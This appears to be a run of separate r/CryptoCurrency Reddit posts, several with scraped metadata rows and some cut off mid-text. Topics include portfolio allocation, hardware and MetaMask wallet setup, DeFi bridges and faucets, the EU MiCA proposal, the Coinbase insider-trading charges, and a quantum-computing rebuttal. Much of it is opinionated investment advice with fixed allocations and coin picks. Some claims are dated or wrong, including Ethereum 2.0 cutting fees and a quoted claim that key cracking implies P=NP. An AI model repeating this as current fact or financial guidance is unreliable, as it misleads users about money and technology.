If its meant to be just used as just a currency: Take a look at the circulating supply and look at the amount that is in cold storage or set to be released/burned. Most cryptos are deflationary so think about how the float schedule will change over time and how this will affect price.Once you have a model you like set up, you can compare cryptos against each other and most importantly it will require that you build a mental framework within your own mind on why somebody would want to own this coin other than to sell it to another greater fool for a higher price. Modeling out a valuation will lead you to think long term and think about the inherent value, rather than price action.Once you go through this 3-step methodology, you'll have a pretty good confidence level for making your decision and can comfortably sit back and not panic if some temporary short term condition leads to a price decrease. This is how 'smart money' does it.## Think about your portfolio allocationYou should think first in broad terms how you allocate between 'safe' and 'speculative' cryptos. For new investors its best to keep a substantial portion in what would be considered largecap safe cryptos, primarily BTC and ETH. I personally consider XMR to be safe as well. A good starting point is to have between 50-70% of your portfolio in these safe cryptocurrencies. As you become more confident and informed you can move your allocation into speculative small caps.You should also think in terms of segments and how much of your total portfolio is in each segment:- Core holdings - BTC, Ethereum- Smart contracts platform segment - Ethereum, Polkadot, ALGO, Solana etc- Privacy segment - Monero, Zcash etc- Finance/Bank settlement segment - Stellar ...etc- Enterprise Blockchain solutions segment -VeChain ...etc- Promising/Innovative Tech segment: NANO, ADA, Tezos ...etcYou should also think about where we are in the cycle, as now given so much uncertaintly its probably best to stay heavily in core holdings and pick up a few coins within a segment you understand well. If you don't understand how enterprise solutions work or how the value chain is built through corporations, don't invest in the enteprise blockchain solutions segment. If you are a techie who loves the technology behind a coin, invest in that.## Think of your 'circle of competence'This is actually a term Buffet came up with, it refers to your body of knowledge that allows you to evaluate an investment. Think about what you know best and consider investing in those type of coins. If you don't know anything about how supply chains functions, how can you competently judge whether VeChain will achieve adoption? This where your portfolio allocation also comes into play. You should diversify but really shouldn't be in much more than around 12 cryptos, because you simply don't have enough competency to accurately access the risk across every category and for every type of crypto you come across. If you had over 20 different cryptos in your portfolio you should probably think about consolidating to a few sectors you understand well.## Continually educate yourself about the technology and marketsIf you aren't already doing it: Read a bit each day about cryptocurrencies. There are decent Youtubers that talk about the market side of crypto, just avoid those that hype specific coins and look for more sceptical ones like CryptoInvestor. If you don't understand how the technology works and what the benefits of a blockchain are or how POS/POW works or what a DAG is or how mining actually works, learn first. If you don't care about the technology or find reading about it tedious, you shouldn't invest in this space at all.‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚ÄîThere is no tldr haha.

Every wallet has a public key and a private key, but we'll get back to this later. But first...# Why do you need a wallet?There's an old saying in Tennessee that says: **'Not your keys, not your coins.'** What it actually means is that if you keep your cryptocurrencies on an exchange (such as Coinbase, Binance or Kraken), you don't actually own those coins, because you don't have the keys to the related wallet. You gain access to those wallets by logging into these exchanges, but your account can - theoretically - be deleted in the blink of an eye, or the exchange can get hacked, attacked, etc. And with it, your funds can disappear forever. If you want to learn more about this, make sure to look up Mt. Gox's hacking. It is an unfortunate event, but one that puts you on guard. So you already know that you need to own your keys in order to own your coins. **But what are these keys?**Your **public key** is what identifies your account on the network. Think of it as your email address, because when someone wants to send you cryptocurrency, they will send it to this address. Your **private key** is a string of 64 characters that can be generated from a 12-word seed phrase. It basically serves as the password of your account. It is used to sign transactions and to prove that you own the related public key. See, it's not that complicated, is it?# About wallet typesThere are 4 types of wallets that you should be using. Ideally, you can pick the one that fits your crypto habits the most. You should avoid using Web wallets. As always, if you can, please pick the safest wallet type in order to minimize the risk of losing your cryptos. **Hardware / Offline / Cold Wallet** '- an offline storage device (e.g. hard disk, USB stick). You might've heard the names Ledger or Trezor, these are the 2 biggest brands at the moment. The ledger supports over 1200 cryptocurrencies, while Trezor supports over a thousand. It is also the most secure way to store your cryptocurrencies. **Mobile Wallet** '- applications that are installable on your mobile phone. Beware that even though an app can hold crypto, it doesn't mean it is NOT custodial. (e.g. Coinbase has a mobile app, but it is custodial, meaning that they control your coins.) Exodus or Atomic mobile apps are recommended if you decide to create a mobile wallet.**Desktop Wallet** '- wallets that are installable on different desktops and are compatible with Windows, Mac, and Linux. Your keys are stored on your computer, and you can use this wallet even when you're offline. Note: Desktop wallets tend to be more advanced than mobile wallets, and usually come with more technically complicated features that can increase privacy or allow for more flexibility when it comes to signing transactions.**Paper wallet** '- a paper wallet is essentially a piece of paper including your public and private key, or a QR code (so that you can quickly scan them and add the keys to a software wallet to make a transaction). It's a really safe way to store your cryptos because your keys are not connected to any servers. The only way someone can steal your cryptos is if they steal this paper.# The Best Hardware Wallets**Ledger Nano (S and X)** '- The most popular hardware wallet brand in the world, currently sells 2 different sticks. The S is the cheaper alternative, but if you handle transactions between multiple cryptocurrencies frequently, the larger storage of the Nano X should be more convenient. The Nano X also has Bluetooth 5.0 support. You can read more about Ledgers on their website. Beware that **Ledger was targeted by a cyberattack that led to a data breach** in July 2020. A larger subset of detailed information has been leaked, approximately 272,000 detailed information such as postal address, last name, first name, and telephone number of our customers. However, not a single coin was stolen as hackers didn't gain access to private keys. Please keep this in mind when making your decision. **Trezor (One and Model T)** '- Trezor is the other popular hardware wallet brand. The Trezor One is the cheaper alternative ($59), while the Model T is more expensive but comes with extended functionality and additionally supports cryptocurrencies such as ADA, XMR, XTZ, etc.Despite the security of hardware devices themselves, **the weakest link is always the people using them.** If possible, avoid buying used hardware wallets, even though both Trezor and Ledger have security measures to avoid the attempt of installing malwares.# The Best Desktop Wallets**Exodus** '- a very user-friendly and easy to understand, reliable wallet. As of now, it is probably the most popular desktop wallet. Available on Windows, Mac and Linux as well. **Atomic** '- it is also a user-friendly and reliable wallet. Atomic supports 500+ assets and allows staking various cryptocurrencies. Available on Windows, Mac and Linux.Of course, there are several other reliable desktop wallets, but these two proved to be the most user-friendly and easy to use wallets so far. As always, please DYOR!**If you decide to go with a mobile wallet** (instead of a paper, hardware, or a desktop wallet), Exodus or Atomic are both available on iOS and Android. Please avoid installing 10+ crypto wallet applications on your phone, because you'll make it impossible to keep track of your keys and passwords eventually.Last piece of advice: always be cautious and double-check everything.

With this guide I would like to help you getting started with learning the basic fundamentals of DeFi and setting up your wallet and tools. I tried to make this guide as complete as possible.# FundamentalsLet's start with some fundamentals first.# What is Decentralized FinanceDecentralized Finance (DeFi) is a movement that uses decentralized networks and blockchains to transform traditional financial products into trustless and transparent protocols that work without intermediaries.Currently, almost all DeFi applications are built on the Ethereum blockchain and Binance Smart Chain (EDIT: Binance Smart Chain is NOT as decentralized as Ethereum and is therefore often labeled as CeDeFi). Like Bitcoin, Ethereum and Binance have a blockchain that acts as a shared ledger in which digital value is tracked. Rather than a central authority, the participants making up the network control the issuance of ether (or BNB), the network's cryptocurrency, in a decentralized way.Developers can program applications that can create, store and manage digital assets, also known as tokens, on the blockchain. For this to work, smart contracts and decentralized applications (DApps) are written and built. The expiration of these contracts and agreements is automatically enforced if the blockchain receives the correct data. You can make complex, irreversible agreements without the need for an intermediary.Anyone is able to create, adapt, mix, link or build on an existing DeFi product without permission. DeFi protocols are modular, so they can be stacked on top of each other to build an increasingly dense system of interacting parts.# WalletsYou can download a wallet on a PC, tablet or telephone. With this you can store, send or receive Bitcoin or other cryptocurrencies. Three related concepts determine whether someone has ownership of a certain wallet, these are your digital keys (also called public & private keys), your wallet address and your digital signature.The most important aspect of a wallet are your digital keys, as they give you access to your wallet. It is important to know that these keys are not stored online on the blockchain but are instead stored independently within the digital wallet itself. Each key consists of both a public key and a private key.Consider your public key the same as the bank account, which also consists of an address. Your public key works more or less the same. The pin code with which you subsequently gain access to this bank account is then referred to as your private key.It is very important that you ALWAYS keep your private key to yourself. If someone else has the private key, he / she can send and steal all coins, so keep it safe. With the public key, people can only send coins, so that can't hurt.Every wallet has a unique code, which we also call the wallet address, which consists of a random letter and number combination that is different for everyone. This address is in fact the name of your wallet and makes it possible for others to transfer cryptocurrencies to you.Example of just any bitcoin address: 14J5Q7ageKhM3miKd94DX44Kf6b7ko4BZeSome people assume that your public key is the same as your wallet address. This is not entirely true, but the two are mathematically related.In order for you to start using DeFi platforms, a browser wallet is needed.# Coins vs TokensA coin runs on its own blockchain, on its own system. It is therefore completely independent. A coin could be compared to a contemporary currency, such as the Dollar. Bitcoin is a coin and has been developed with the aim of serving as a digital payment method and store of value.Then there are tokens. Tokens by definition do not run on their own blockchain, unlike a coin. They have been added to an already existing blockchain. Tokens can have the same functionality as a coin, although this is not common.Tokens that are created on the Ethereum network are typically ERC-20 tokens. When we talk about ERC20, we mean the standard that is implemented in certain tokens. ERC20 stands for 'Ethereum Request for Comment 20'. The Binance Smart Chain uses a similar standard, which is the BEP-20 standard.These standards contains numerous functions that allow any token that has implemented this set of functions to be traded. Examples of those functions are:* Sending tokens.* Request balance information from any address.* List the number of available tokens.# Layer 2 solutionsBecause of high demand, the Ethereum network is getting overloaded. This resulted in very high transaction fees, making it to expensive for small investors to use it's dapps.This is the main reason why many investors moved to the Binance Smart Chain, which has much lower fees, untill Ethereum 2.0 has been implemented, which is an update that will drastically lower the transaction fees for the network.However, in order for the Binance Smart Chain to maintain such low transaction fees, it had to sacrifice it's decentralized properties. This resulted in that the Binance Smart Chain is much more centralized and less safe compared to Ethereum.Fortunately, there are various projects working on Layer 2 solutions to improve both the scalability and speed of the Ethereum network. Layer 2 refers to a secondary framework, chain or protocol that is built on top of an existing blockchain system. By doing so, the mainchain can be unloaded and can solely focus on the safety of the network.In the case of Ethereum, there are currently 2 sidechains that are pegged to it. These chains are the xDai chain and the Polygon chain. The latter of the sidechains is the most promising Layer 2 solution so far.By bridging your assets from the Ethereum mainchain to the sidechains, you are able to interact with various dapps that work on these sidechains for almost an negligible amount transaction fees.# Getting startedNow that you're aware of the fundamentals of DeFi, let's dive into how you can move your assets into the various DeFi protocols.# Setting up your walletIn order to move your assets from your wallet on the exchange that you're using to either the Ethereum network, Binance Smart Chain, or Sidechains, you will need a browser wallet that can interact with these DeFi protocols.I'm currently using MetaMask, so I will use this browser wallet in this guide:1. Go to the official MetaMask website in your browser ([https://metamask.io/](https://metamask.io/))2. Press Get Chrome extension, Chrome Firefox Opera or Get Brave Browser. This of course depends on the browser you want to use at that time.3. You will now be taken to a page where you can add the extension. With Chrome, for example, there is a button with: + ADD. TO CHROME. Click on the button.4. A popup appears to confirm this5. You will now see a MetaMask logo at the top right of the browser. Click this to set up MetaMask.6. Accept the terms and conditions7. Create and confirm a new password. Please remember this password.8. You will now see 12 words. With these words you can always recover your wallet - in combination with the password. Write these words down and keep them safe. Preferably offline - just on paper.9. Congratulations! You have now installed and configured a MetaMask extension. You can now use the buttons Buy and Send to buy or send Ether to your wallet. You can now also send Ethereum to the address under Account 1.Your MetaMask wallet will be automatically connected to the Ethereum network. In order to connect your MetaMask to the Binance Smart Chain, Polygon or xDai, follow these steps:1. Click on the network in the top right corner.2. Go to settings.3. Click 'Add network'In order to setup your wallet for the Binance Smart Chain, enter the following parameters:Network Name: Smart ChainNew RPC URL: [https://bsc-dataseed.binance.org/](https://bsc-dataseed.binance.org/)ChainID: 56Symbol: BNBBlock Explorer URL: [https://bscscan.com](https://bscscan.com/)&#x200B;In order to setup your wallet for the Polygon sidechain, enter the following parameters:Network Name: Matic MainnetNew RPC URL: [https://rpc-mainnet.maticvigil.com/](https://rpc-mainnet.maticvigil.com/)ChainID: 137Symbol: MATICBlock Explorer URL: [https://explorer.matic.network/](https://explorer.matic.network/)&#x200B;In order to setup your wallet for the xDai sidechain, enter the following parameters:Network Name: xDaiNew RPC URL: [https://rpc.xdaichain.com/](https://rpc.xdaichain.com/)Chain ID: 0x64Symbol: xDaiBlock Explorer URL: [https://blockscout.com/xdai/mainnet](https://blockscout.com/xdai/mainnet)# FaucetsIn order to be able to perform transactions on these chains, you need to have some of their coins/tokens in your wallet in order to pay for the transaction fees.* In order to use Ethereum you need Ether* In order to use Binance Smart Chain you need BNB* In order to use xDai you need xDai* In order to use Polygon you need MaticLuckily you can get small amounts of the currencies for free from so called faucets.A faucet is an app or a website that distributes small amounts of cryptocurrencies. They're given the name faucets'' because the rewards are small, just like small drops of water dripping from a leaky faucet.However, in the case of crypto faucets, tiny amounts of free or earned cryptocurrency are sent to a user's wallet. In order to get free crypto, users need to complete tasks as simple as viewing ads, watching product videos, completing quizzes, clicking links (be careful!) or completing a captcha.You can use the following faucets to receive small amounts of crypto:* xDai: [https://blockscout.com/xdai/mainnet/faucet](https://blockscout.com/xdai/mainnet/faucet)* Matic: [https://matic.supply](https://matic.supply)Unfortunately. I wasn't able to find any faucets for Ether or BNB.# Sending crypto from the exchange to MetaMaskIn order to receive send your assets to MetaMask wallet, you need to fill in the correct address. This is probably straight forward for most of you, but please make sure to quadruple check you're MetaMask wallet address before sending your tokens from the exchange to your address.When you're sending tokens from Binance, it will ask if you want to send them as BEP20 or ERC20 tokens. Please choose the correct one! Sending BEP20 tokens to your Ethereum address can result in a loss or they end up in your Binance Smart Chain wallet.# Bridging: An important step!Please notice that you can't send your tokens directly from the exchange to sidechains such as xDai or Polygon! You need to send them first to the Ethereum network (as they are both sidechains pegged to the Ethereum blockchain). Once received, you can bridge them to xDai or Polygon by using the following links:* [https://bridge.xdaichain.com/](https://bridge.xdaichain.com/)* [https://wallet.matic.network/bridge/](https://wallet.matic.network/bridge/)Keep in mind that for during the bridging, Ethereum transactions fees have to be paid. After the bridging, you play by the rules of the sidechain (which means cheap transactions).# I can't find my tokens in my wallet!If you can't find your tokens back in your wallet after sending them from the exchange, you can follow these steps:* Check the transaction record, is the transaction completed?* Make sure you look at the right network. Your MetaMask wallet might be connected to the Binance Smart Chain network, hence not showing your assets.* Add the contract address of your token to the wallet. You can find the address of your token via [https://etherscan.io](https://etherscan.io/) (Ethereum) or [https://bscscan.com](https://bscscan.com/yieldfarms) (Binance Smart Chain). The token address can then be copied in to the MetaMask wallet by clicking on add custom token.# Setting up your dashboardTo make things a bit more clear, I would advice you to use the DeFi dashboard [Zapper.fi](https://zapper.fi/). Zapper is an interesting platform that lets you quickly and easily deploy and manage your DeFi positions within a single interface. It is a DeFi portfolio management dashboard that helps you stay on top of your portfolio, liquidity pools, and liquidity mining positions.Zapper supports Ethereum, Binance Smart Chain, xDai and Polygon. In order to connect to the right network, you must first connect your MetaMask to the network you want zapper to connect to. By clicking in the top right corner of your MetaMask wallet you can connect to the network you want Zapper to manage for you.The first tab of Zapper, shows an overview of your account. It shows the value of your assets in your MetaMask wallet and how your deployed assets are performing in the DeFi protocols (if you deployed any already).In order to reduce gas fees, Zapper has several features that can 'Zap' your assets fast and 'cheap' in order to:* Start providing liquidity in a pool.* Swap tokens.* Bridge your tokens from one network to another.Zapper also keeps track of the estimated APY's (Annual Percentage Yield) of the various pools from different DeFi protocols as well as farming opportunities.# A list of DeFi protocolsBefore wrapping this post up, I want to share the following website: [https://defipulse.com/](https://defipulse.com/)DeFi Pulse records the top performing DeFi protocols on the Ethereum main chain as well as their TVL (total locked value) and ranks them accordingly. This page is really worth checking out as it can help you to pick the right protocols to deploy your assets in.In order to monitor the DeFi space of Binance Smart Chain, Polygon and xDai I like to use [https://dappradar.com/rankings/category/defi](https://dappradar.com/rankings/category/defi) and [https://defiprime.com/#defi'_projects](https://defiprime.com/#defi_projects). However, If you use other resources in order to find the right dapp, let me know!# That's it for this guide!I really do hope that this guide helps you to get started on your DeFi adventure.If I missed something or whatever let me know so I can change it.&#x200B;* If you found this guide helpful, [please read my DeFi (Decentralized Finance) series](https://www.reddit.com/r/CryptoCurrency/comments/mdjsrj/defi_explained_defi_wallets/).

While everyone is focused on the US and China, the EU is casually leading the way.The Council of the European Union (all EU Ministers of Finance or Economics) has just given its permission to start negotiations with the European Parliament (basically: things just got real). If they both approve the proposed Regulation, it will become EU law. I expect the Regulation to be voted through relatively easily with only minor amendments. The final legal text to become official EU law will thus be *very similar* to the current proposal I will be discussing in this post.The European Union emphasizes that they have an interest in developing and promoting the uptake of transformative technologies in the financial sector, including distributed ledger technology (DLT). They state that this Regulation is meant to: support innovation and fair competition, while ensuring a high level of protection of retail holders and market integrity in crypto-asset markets, enable crypto-asset service providers to scale up their business on a cross-border basis, and facilitate their access to banking services to run their activities smoothly'. The EU also says that they do not (!) intend to regulate the underlying technology of crypto-assets.I will now discuss (1) the rules this Regulation sets out for issuers/offerors of different categories of crypto-assets and (2) the rules set out for exchanges operating in the European Union.*Rules in this Regulation for Issuers/Offerors of Crypto-Assets***A) Crypto-assets that are unique and not fungible with other crypto-assets: no regulations**NFTs, including digital art and collectibles are not (!) bound to the rules described in this Regulation, even when these assets are traded in market places and when they have (high) speculative value.**B)** **Utility Tokens: no regulations**Utility token' means a type of crypto-asset which is only intended to provide access to a good or a service supplied by the issuer of that token (EU definition). Utility tokens are not (!) bound to the rules described in this Regulation, as long as the good or service exists or is in operation.**C)** **Crypto-assets offered for free: no regulations**Crypto-assets where the receiver does not give money, fees, personal data or commissions to the offerors/issuers in return for those crypto-assets, are not (!) bound to bound to the rules described in this Regulation. This may be good news for Moons (there is no active exchange of personal data in return for Moons; even when Reddit collects personal data from all users).**D) Crypto-assets that are automatically created as a reward for the maintenance of the DLT or the validation of transactions in the context of a consensus mechanism: no regulations**These crypto-assets are not (!) bound to the rules described in this Regulation.**E) E-Money (stablecoins): very strict regulations**Electronic money token' or e-money token' means a type of crypto-asset that purports to maintain a stable value by referencing to the value of an official currency of a country (EU definition). These tokens will be strictly regulated. Only recognized credit institutions and electronic money institutions' are allowed to issue e-money stablecoins. They will have to follow very strict rules (see Regulation Title IV for further details). Edit 1: As part of these strict rules, it seems that EU citizens would also not be able to earn interest on stablecoins, as pointed out by u/TheWerewolf5. Edit 2: it will take a while before this is all signed into law so exchanges still have a few years to phase out Tether for regulated stablecoins. There won't be a sudden Tether apocalypse. **F) Asset-Referenced Tokens (stablecoins): very strict regulations**Asset-referenced token' means a type of crypto-asset that is not an electronic money token and that purports to maintain a stable value by referencing to any other value or right or a combination thereof, including one or several official currencies of a country (EU definition). This is what Facebook/Meta tried to do with Libra. These tokens will be strictly regulated. Only recognized credit institutions and entities that have been granted permission by the authority of an EU Member State can issue asset-referenced stablecoins in the European Union. They will have to follow very strict rules (see Regulation Title III for further details).**G)** **Crypto-assets that do not belong to any of the previously mentioned categories (e.g. payment coins that do not promise a stable value or tokens that cannot be seen as utility tokens): some regulations**These crypto-assets face some regulation. The Regulation describes very detailed rules on the contents of white papers and also establishes rules on marketing communications. This is bad news for scams with poorly written, undetailed white papers and those using misleading forms of marketing. The European Securities and Markets Authority (ESMA) will most likely establish templates and standards for white papers in the crypto-industry (see Regulation Title II for further details).*Rules in this Regulation for Exchanges and Custodians***A) Exchanges / custodians (centralized): rather strict regulations**The Regulation focuses on establishing strict rules, such as: the obligation to apply for official authorization in an EU Member States; the obligation to act in the best interest of clients; the obligation for capital requirements, safeguards and insurance policies; the obligation to follow organizational requirements; the obligation to protect the crypto-assets and funds of clients; the obligation to hold the crypto-assets of clients in separate accounts than the accounts belonging to the exchange; the obligation to maintain effective and transparent complaint handling procedures; the obligation to identify, disclose and prevent conflicts of interest; the obligation to have resilient trading systems with sufficient capacity to deal with peak order and message volumes; and much more (see Regulation Title V for further details).There is, however, a small but concerning statement for privacy coins: The operating rules of the trading platform for crypto-assets shall prevent the admission to trading of crypto-assets which have inbuilt anonymisation function unless the holders of the crypto-assets and their transaction history can be identified by the crypto-asset service providers that are authorised for the operation of a trading platform for crypto-assets. What exactly they mean with this and which coins exactly fall under this category still remains to be seen. But I don't think this comes as a shock for many.**B) Fully decentralized exchanges and DeFi: no regulations (yet)**Fully decentralized exchanges and DeFi protocols are not (!) bound to the rules described in this Regulation. Exchanges that are only partially decentralized may be bound to some of the rules in this Regulation but this is up for interpretation. The EU will, in the next few years, explore whether or not they will regulate this specific space.**C)** **Self-custody software wallets / hardware wallets: no regulations**These are not (!) bound to the rules described in this Regulation. Remember the huge 'EU will ban anonymous wallets' FUD a few months ago? It was all a lie. No rules!*Overall assessment*I am pleasantly surprised. While some of you want nothing to do with regulation, which I respect, this seems very reasonable and a step in the right direction. This text has clearly been written by highly knowledge civil servants and has been endorsed by EU Ministers of Finance with a more open approach to blockchain and cryptocurrencies than their non-EU counterparts. The EU made the mistake of allowing the US/Asia to dominate the tech industry. They do not want to repeat that mistake with the cryptocurrency space.**TL;DR: Cryptocurrency will still be the 'Wild West of Finance'; but now there will be a new Sheriff in town. And that Sheriff, is the European Union. It does no longer tolerate unregulated stablecoins; it does no longer tolerate shady projects with no utility, crappy white papers, and misleading marketing; and it sure as hell does no longer tolerate unprofessional exchanges who screw EU citizens out of their money. But it does like innovation and it will try** ***not*** **to hinder development in the cryptocurrency and blockchain space because they have made similar mistakes before in other industries.**Link to follow-up on the Ordinary Legislative Procedure: [https://eur-lex.europa.eu/legal-content/EN/HIS/?uri=CELEX:52020PC0593](https://eur-lex.europa.eu/legal-content/EN/HIS/?uri=CELEX:52020PC0593)Link to the proposed EU Regulation on Markets in Crypto-Assets: [https://www.consilium.europa.eu/media/53105/st14067-en21.pdf](https://www.consilium.europa.eu/media/53105/st14067-en21.pdf)Link to the 'Brussels Effect': [https://en.wikipedia.org/wiki/Brussels'_effect](https://en.wikipedia.org/wiki/Brussels_effect)Blogs, crypto journalists (you know who you are), etc. are all free to use the info in this post. **No need to credit me**.

In that role, ISHAN WAHI was involved in the highly confidential process of listing crypto assets on Coinbase's exchanges and had detailed and advanced knowledge of which crypto assets Coinbase was planning to list and the timing of public announcements about those crypto asset listings.  Beginning at least in August 2021 and continuing through May 2022, ISHAN WAHI was a member of a private Coinbase messaging channel reserved for a small number of Coinbase employees with direct involvement in the Coinbase asset listing process.  The private channel was used to discuss, among other things, exact announcement / launch dates + timelines that Coinbase did not wish to share with all of its employees.***The Insider Trading Scheme:***On at least 14 occasions beginning at least in June 2021 and continuing through April 2022, ISHAN WAHI knew in advance both that Coinbase planned to list particular crypto assets and the timing of Coinbase's public announcements of those asset listings and misappropriated that Coinbase confidential information by tipping either his brother, NIKHIL WAHI, or ISHAN WAHI's friend and associate, SAMEER RAMANI, so that they could place profitable trades in those crypto assets in advance of Coinbase's public listing announcements.After getting tips from ISHAN WAHI, NIKHIL WAHI and RAMANI used anonymous Ethereum blockchain wallets to acquire crypto assets shortly before Coinbase publicly announced that it was listing or considering listing these crypto assets on its exchanges.  Following Coinbase public listing announcements, NIKHIL WAHI and RAMANI sold the crypto assets for a profit.  Based on confidential information provided by ISHAN WAHI, NIKHIL WAHI and RAMANI collectively traded shortly in advance of at least 14 separate Coinbase public listing announcements concerning at least 25 different crypto assets.  As a result of the insider trading scheme, NIKHIL WAHI and RAMANI collectively generated realized and unrealized gains totaling at least approximately $1.5 million.To conceal their purchases of crypto assets in advance of Coinbase listing announcements, NIKHIL WAHI and RAMANI used accounts at centralized exchanges held in the names of others, and transferred funds, crypto assets, and proceeds of their scheme through multiple anonymous Ethereum blockchain wallets.  NIKHIL WAHI and RAMANI also regularly created and used new Ethereum blockchain wallets without any prior transaction history in order to further conceal their involvement in the scheme.***ISHAN WAHI's Attempt to Flee the United States:***On April 11, 2022, Coinbase announced that it was considering potentially listing dozens of crypto assets on its exchanges. Based on Coinbase confidential information provided by ISHAN WAHI, RAMANI caused multiple anonymous Ethereum blockchain wallets to purchase large quantities of at least six of the crypto assets that were to be included in Coinbase's April 11, 2022 listing announcement.Shortly after RAMANI traded in advance of Coinbase's April 11 listing announcement, on April 12, 2022, a Twitter account that is well known in the crypto community tweeted regarding an Ethereum blockchain wallet that bought hundreds of thousands of dollars of tokens exclusively featured in the Coinbase Asset Listing post about 24 hours before it was published.  The trading activity referenced in the April 12 tweet was the trading caused by RAMANI.  Coinbase thereafter publicly replied on Twitter noting that it had already begun investigating the matter and a few weeks later stated in a public blog post that any Coinbase employee who leaked confidential company information would be immediately terminated and referred to relevant authorities (potentially for criminal prosecution).On May 11, 2022, Coinbase's director of security operations emailed ISHAN WAHI to inform him that he should appear for an in-person meeting relating to Coinbase's asset listing process at Coinbase's Seattle, Washington office on Monday, May 16, 2022. ISHAN WAHI confirmed he would attend the meeting.On the evening of Sunday, May 15, 2022, ISHAN WAHI purchased a one-way flight to India that was scheduled to depart the next day shortly before ISHAN WAHI was supposed to be interviewed by Coinbase.  Prior to boarding the flight, ISHAN WAHI falsely told Coinbase employees that he had already departed for India when he had not.  In the hours between booking the flight and his scheduled departure, ISHAN WAHI called and texted NIKHIL WAHI and RAMANI about Coinbase's investigation, and sent both of them a photograph of the messages he had received on May 11, 2022, from Coinbase's director of security operations.  Prior to boarding the May 16, 2022 flight to India, ISHAN WAHI was stopped by law enforcement and prevented from leaving the country.You can read the entire transcript here:[https://www.justice.gov/usao-sdny/pr/three-charged-first-ever-cryptocurrency-insider-trading-tipping-scheme](https://www.justice.gov/usao-sdny/pr/three-charged-first-ever-cryptocurrency-insider-trading-tipping-scheme)",False,A Coinbase Product Manager was Just Charged With Insider Trading and Arrested While Trying to Flee the Country,u/[deleted],15,7525,0.96,https://www.reddit.com/r/CryptoCurrency/comments/w4jflp/a_coinbase_product_manager_was_just_charged_with/,[]

Technical analysts observe patterns of price movements, trading signal and other analytical tools to evaluate the strength and weakness of an asset. ¬†Technical Analysis can be applied to any security with historical trading data such as cryptocurrencies, forex, commodities and stocks.A chart of prices and volume represents all the past decisions taken by market participants (buying and selling). This information will, in turn, affect future participant decisions in two ways:* **Psychological**: What you did in the past affects how you approach future situations. For example, many traders tend to focus on the price at which they bought an asset, and if it declines, they want to sell when it reaches break-even again.* **Reflexive**: Some traders identify trends and chart patterns which are common, and act accordingly (buying or selling). If a sufficient number of participants follow the same strategy, it is expected that these chart patterns will follow the expected outcome and that the trend will likely to be sustained by more and more participants joining the trend.**Bollinger Bands**Bollinger Bands display a graphical band (the envelope) with a simple moving average in the middle.

Yes, I know a month feels like an entire year in crypto, but investment is NORMALLY supposed to be a multi-decade affair. Meanwhile longterm for most of us means 2022 at the latest. DO YOUR OWN RESEARCH.**FOR THE DAY TRADERS**In general, you have a very simple job. Look at graphs, do some TA, make a plan, invest based on that and do your best to have orders and trading set up that minimizes risk. So just do that. I don't want to hear a single one of you coming through a subreddit and moaning about how you think something is a shitcoin because it wasn't volatile enough that day to make you dumb amounts of money. No one is saying you aren't making hella money or that you aren't right from a daytrading perspective, but keep that to the trading subreddits where other like-minded people are actually impatient enough to care about that. You should understand that when you put up some pissy comment like that, new investors who haven't the faintest clue on anything will take what you say seriously and model their money movement around your words.Think about that.If I had listened to day traders, as a mid-long term investor, I'd have missed out on NEO (back when it was Antshares), ICX, and XRP. I would have missed out on the following percentage gains:NEO: 1150% Gains as of nowICX: 5080% Gains as of nowXRP: 1720% Gains as of now^Why would I want to miss out on that because of impatience and bad philosophy?**FOR THE SUPPORTERS**For people who are genuinely in this for philosophy, that's great, discuss the merits of your philosophy and vision and why you think the coin aligns with that. Otherwise:SHUT THE FUCK UP.If you don't, you'll start spreading FUD and lies, it's inevitable, the second you decide to trash another coin you're going to do it as a way to feel superior regardless of how good or shitty your investment is.I'm done.",False,I'm Truly Disappointed.,u/[deleted],2,7014,0.87,https://www.reddit.com/r/CryptoCurrency/comments/7n3fxk/im_truly_disappointed/,[]

Factoring in stablecoin gains:  In past years, I have not included the ROI that is possible with stables in the monthly reports.  This year, I will detail ways to build on the $100 of USDC in the 2022 portfolio and gamify it a bit: my goal is to outperform as many as the other cryptos in the 2022 Top Ten Portfolio as possible (simple if it turns out to be a bear year, a bit more challenging if the 2022 market moons).4. Giveaways: Who doesn't love a good old fashioned giveaway? I'll be giving away crypto during the year, either through Twitter, Reddit, or my email list. I'm still figuring out the details, but aim to give away around $100 a month in crypto.5.

The hack was in November which means that he's been insolvent for months & has been defrauding new users out of their money to keep the exchange afloat. Once the Binance listing was imminent he locked all the exchange's assets. His actions show clear intent. If his exchange was hacked & he immediately reported it to the police, he'd just be incompetent but by hiding this from new users he transitioned from moron to criminal. This is the US legal definition of Fraud:* Fraud. A false representation of a matter of fact‚Äîwhether by words or by conduct, by false or misleading allegations, **or by concealment of what should have been disclosed**‚Äîthat deceives and is intended to deceive another so that the individual will act upon it to her or his legal injury.[In order to be convicted of fraud in the US, the following must be proved:](https://legal-dictionary.thefreedictionary.com/fraud)>Fraud must be proved by showing that the defendant's actions involved five separate elements: > * (1) a false statement of a material fact,>* (2) knowledge on the part of the defendant that the statement is untrue, >* (3) intent on the part of the defendant to deceive the alleged victim, >* (4) justifiable reliance by the alleged victim on the statement, and >* (5) injury to the alleged victim as a result.Now I'm not a lawyer but it seems to me that he is clearly guilty & convictable. It's likely the EU/Italian definition is the same since fraud is a universal crime. [He may also be guilty of running a ponzi scheme](https://www.law.cornell.edu/wex/ponzi_scheme)We need to make sure people don't get away with this sort of thing. I don't want to say he's destroyed people's lives because there is almost always a way to recover but he has certainly severely damaged peoples wellbeing. I'm in the US but if someone in the EU/Italy could contact the authorities & let them know about the situation maybe we can get a little bit of justice for his victims.

This is some of the weakest FUD but people still seem to be falling for this.Edit: Lots of comments seem to suggest that governments are developing or have developed 'quantum computers' that can crack/hack bitcoin private keys. While quantum computers can definitely become a threat to cryptocurrencies in the future, they are not presently anywhere close to being capable of deriving the private key for a bitcoin address. As per u/BreakingBaIIs : > I did a back-of-envelope calculation that showed that it would be faster to mine all the remaining bitcoins 6 billion times than it would to crack a single private key using brute force.> If the FBI found a way to efficiently crack a private key, that would mean they solved the most important math problem humanity has ever faced, that P=NP (in the affirmative). What they could do would go far beyond breaking all of the Internet's security protocols (which they could do). They would be able to solve all the mathematical theorems that humanity has ever worked on for thousands of years, plus many new ones we never thought about, in a matter of days or hours. They would be able to efficiently create superhuman AI using modest computational resources.The complexity of cracking a single BTC private key is large and currently not in existence. Moreover, if such a powerful computer existed, it would be a threat to several other things rather than bitcoin and crypto. The entire internet runs on cryptographic encryption. Nothing would be safe. 